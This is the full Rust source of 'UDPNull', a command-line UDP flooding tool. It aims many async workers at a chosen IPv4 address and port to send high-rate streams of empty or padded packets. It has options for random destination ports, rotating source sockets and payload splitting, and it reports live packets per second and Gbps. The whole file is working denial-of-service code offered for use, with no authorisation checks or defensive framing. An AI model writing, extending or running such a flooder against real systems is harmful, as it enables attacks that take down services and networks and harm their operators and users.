use clap::Parser;
use rand::{Rng, SeedableRng};
use rand_chacha::ChaCha12Rng;
use std::io::Result;
use std::net::{Ipv4Addr, SocketAddr, UdpSocket};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::{Duration, Instant};
use tokio::signal;
use tokio::time;

#[derive(Parser)]
#[command(name = "UDPNull")]
#[command(version = "1.0.0")]
struct Config {
    #[arg(short, long, help = "Target IPv4 address")]
    target: String,

    #[arg(short, long, default_value = "80", help = "Target port")]
    port: u16,

    #[arg(long, default_value = "0", help = "Threads (0 = auto)")]
    threads: usize,

    #[arg(long, default_value = "50000", help = "Packets per second per thread")]
    pps: u64,

    #[arg(long, default_value = "0", help = "Packet size (0 = NULL)")]
    size: usize,

    #[arg(long, default_value = "false", help = "Random destination ports")]
    random_ports: bool,

    #[arg(long, default_value = "false", help = "Random source ports")]
    random_src: bool,

    #[arg(long, default_value = "false", help = "Fragment packets")]
    fragment: bool,
}

struct Metrics {
    sent: AtomicU64,
    errors: AtomicU64,
    bytes: AtomicU64,
    running: AtomicBool,
}

impl Metrics {
    fn new() -> Self {
        Self {
            sent: AtomicU64::new(0),
            errors: AtomicU64::new(0),
            bytes: AtomicU64::new(0),
            running: AtomicBool::new(true),
        }
    }

    fn add_sent(&self, bytes: u64) {
        self.sent.fetch_add(1, Ordering::Relaxed);
        self.bytes.fetch_add(bytes, Ordering::Relaxed);
    }

    fn add_error(&self) {
        self.errors.fetch_add(1, Ordering::Relaxed);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    fn is_running(&self) -> bool {
        self.running.load(Ordering::Relaxed)
    }

    fn get_sent(&self) -> u64 {
        self.sent.load(Ordering::Relaxed)
    }
    fn get_errors(&self) -> u64 {
        self.errors.load(Ordering::Relaxed)
    }
    fn get_bytes(&self) -> u64 {
        self.bytes.load(Ordering::Relaxed)
    }
}

struct Engine {
    sockets: Vec<UdpSocket>,
    payload: Vec<u8>,
    socket_idx: usize,
    port_pool: Vec<u16>,
    rng_state: u64,
}

impl Engine {
    fn new(id: usize, packet_size: usize, random_src: bool) -> Result<Self> {
        let socket_count = if random_src { 64 } else { 32 };
        let mut sockets = Vec::with_capacity(socket_count);

        for i in 0..socket_count {
            let socket = if random_src {
                UdpSocket::bind("0.0.0.0:0")?
            } else {
                let bind_port = ((id * 1000 + i + 20000) % 65000 + 1000) as u16;
                UdpSocket::bind(format!("0.0.0.0:{}", bind_port))
                    .or_else(|_| UdpSocket::bind("0.0.0.0:0"))?
            };

            socket.set_nonblocking(true)?;
            sockets.push(socket);
        }

        let mut rng = ChaCha12Rng::seed_from_u64((id as u64) * 0xDEADBEEF + 0xCAFEBABE);
        let payload = if packet_size == 0 {
            Vec::new()
        } else {
            vec![0u8; packet_size]
        };

        let mut port_pool = Vec::with_capacity(8192);
        for _ in 0..8192 {
            port_pool.push(rng.random_range(1024..=65535));
        }

        Ok(Self {
            sockets,
            payload,
            socket_idx: 0,
            port_pool,
            rng_state: (id as u64) * 31337 + 42,
        })
    }

    fn fast_rng(&mut self) -> u32 {
        self.rng_state = self.rng_state.wrapping_mul(1103515245).wrapping_add(12345);
        (self.rng_state >> 16) as u32
    }

    fn get_next_socket_index(&mut self) -> usize {
        let idx = self.socket_idx;
        self.socket_idx = (self.socket_idx + 1) % self.sockets.len();
        idx
    }

    fn send_null_packet(
        &mut self,
        target: SocketAddr,
        random_ports: bool,
        fragment: bool,
    ) -> Result<usize> {
        let addr = if random_ports {
            let port_idx = (self.fast_rng() as usize) % self.port_pool.len();
            let port = self.port_pool[port_idx];
            SocketAddr::new(target.ip(), port)
        } else {
            target
        };

        if fragment && !self.payload.is_empty() {
            let chunk_size = ((self.fast_rng() % 57) + 8) as usize;
            let mut total_sent = 0;
            let payload_len = self.payload.len();
            let socket_idx = self.get_next_socket_index();

            for start in (0..payload_len).step_by(chunk_size) {
                let end = (start + chunk_size).min(payload_len);
                let chunk = &self.payload[start..end];

                match self.sockets[socket_idx].send_to(chunk, addr) {
                    Ok(n) => total_sent += n,
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        total_sent += chunk.len();
                    }
                    Err(e) => return Err(e),
                }
            }
            Ok(total_sent)
        } else {
            let socket_idx = self.get_next_socket_index();
            self.sockets[socket_idx].send_to(&self.payload, addr)
        }
    }
}

async fn null_worker(
    id: usize,
    target: SocketAddr,
    pps: u64,
    packet_size: usize,
    random_ports: bool,
    random_src: bool,
    fragment: bool,
    metrics: Arc<Metrics>,
) {
    let mut engine = match Engine::new(id, packet_size, random_src) {
        Ok(e) => e,
        Err(_) => return,
    };

    let base_interval_ns = if pps > 0 { 1_000_000_000 / pps } else { 1000 };
    let mut interval_ns = base_interval_ns;
    let mut next_send = tokio::time::Instant::now();
    let mut consecutive_errors = 0u32;

    let burst_size = match pps {
        0..=1000 => 1,
        1001..=10000 => pps / 1000,
        10001..=100000 => pps / 5000,
        _ => pps / 10000,
    }
    .max(1)
    .min(100);

    while metrics.is_running() {
        let now = tokio::time::Instant::now();

        if now >= next_send {
            let mut burst_sent = 0;

            for _ in 0..burst_size {
                if !metrics.is_running() {
                    break;
                }

                match engine.send_null_packet(target, random_ports, fragment) {
                    Ok(bytes) => {
                        metrics.add_sent(bytes.max(1) as u64);
                        burst_sent += 1;
                        consecutive_errors = 0;
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        metrics.add_sent(packet_size.max(1) as u64);
                        burst_sent += 1;
                        consecutive_errors = 0;
                    }
                    Err(_) => {
                        metrics.add_error();
                        consecutive_errors += 1;
                        if consecutive_errors > 1000 {
                            interval_ns = (interval_ns * 11) / 10;
                            consecutive_errors = 0;
                        }
                    }
                }
            }

            if burst_sent > 0 && interval_ns > base_interval_ns / 2 {
                interval_ns = (interval_ns * 99) / 100;
            }

            next_send = now + Duration::from_nanos(interval_ns / burst_size);
        } else {
            let sleep_ns = (next_send - now).as_nanos().min(30000) as u64;
            if sleep_ns > 0 {
                tokio::time::sleep(Duration::from_nanos(sleep_ns)).await;
            }
        }

        if id % 8 == 0 {
            tokio::task::yield_now().await;
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let config = Config::parse();

    let target_ip: Ipv4Addr = config
        .target
        .parse()
        .map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid target IP"))?;

    let target_addr = SocketAddr::new(target_ip.into(), config.port);

    let thread_count = if config.threads == 0 {
        let cores = num_cpus::get();
        (cores * 4).min(512)
    } else {
        config.threads.min(1024)
    };

    println!("UDPNull v1.0.0");
    println!("Target: {}", target_addr);
    println!("Threads: {}", thread_count);
    println!("PPS/thread: {}", config.pps);

    if config.size == 0 {
        println!("Mode: NULL packets");
    } else {
        println!("Packet size: {} bytes", config.size);
    }

    println!("Theoretical max: {} pps", thread_count as u64 * config.pps);

    if config.random_ports {
        println!("Random destination ports: ON");
    }
    if config.random_src {
        println!("Random source ports: ON");
    }
    if config.fragment {
        println!("Fragmentation: ON");
    }

    println!("\nStarting {} worker threads...", thread_count);
    println!("Press Ctrl+C to stop\n");

    let metrics = Arc::new(Metrics::new());
    let mut handles = Vec::with_capacity(thread_count);

    for id in 0..thread_count {
        let metrics_clone = Arc::clone(&metrics);
        let handle = tokio::spawn(null_worker(
            id,
            target_addr,
            config.pps,
            config.size,
            config.random_ports,
            config.random_src,
            config.fragment,
            metrics_clone,
        ));
        handles.push(handle);
    }

    let metrics_clone = Arc::clone(&metrics);
    let status_handle = tokio::spawn(async move {
        let mut interval = time::interval(Duration::from_secs(1));
        interval.set_missed_tick_behavior(time::MissedTickBehavior::Skip);

        let mut last_sent = 0u64;
        let mut last_bytes = 0u64;
        let start_time = Instant::now();
        let mut peak_pps = 0u64;
        let mut peak_gbps = 0.0f64;

        interval.tick().await;

        while metrics_clone.is_running() {
            interval.tick().await;

            let sent = metrics_clone.get_sent();
            let bytes = metrics_clone.get_bytes();
            let errors = metrics_clone.get_errors();

            let elapsed = start_time.elapsed().as_secs().max(1);
            let avg_pps = sent / elapsed;
            let current_pps = sent.saturating_sub(last_sent);
            let gbps = ((bytes.saturating_sub(last_bytes)) * 8) as f64 / 1_000_000_000.0;

            peak_pps = peak_pps.max(current_pps);
            peak_gbps = peak_gbps.max(gbps);

            println!(
                "Sent: {:<12} | Rate: {:<8}/s | Peak: {:<8}/s | Avg: {:<8}/s | Errors: {:<8} | {:.3} Gbps (Peak: {:.3})",
                sent, current_pps, peak_pps, avg_pps, errors, gbps, peak_gbps
            );

            use std::io::Write;
            std::io::stdout().flush().unwrap();

            last_sent = sent;
            last_bytes = bytes;
        }
    });

    tokio::select! {
        _ = signal::ctrl_c() => {
            println!("\nInitiating shutdown...");
        }
    }

    metrics.stop();

    tokio::time::sleep(Duration::from_millis(50)).await;
    status_handle.abort();

    let shutdown_start = Instant::now();
    for handle in handles {
        let _ = tokio::time::timeout(Duration::from_millis(500), handle).await;
    }

    let final_sent = metrics.get_sent();
    let final_errors = metrics.get_errors();
    let final_bytes = metrics.get_bytes();

    println!(
        "\nShutdown completed in {:.2}s",
        shutdown_start.elapsed().as_secs_f64()
    );
    println!("Total packets sent: {}", final_sent);
    println!(
        "Total bytes sent: {} ({:.2} MB)",
        final_bytes,
        final_bytes as f64 / 1_000_000.0
    );
    println!("Total errors: {}", final_errors);

    Ok(())
}
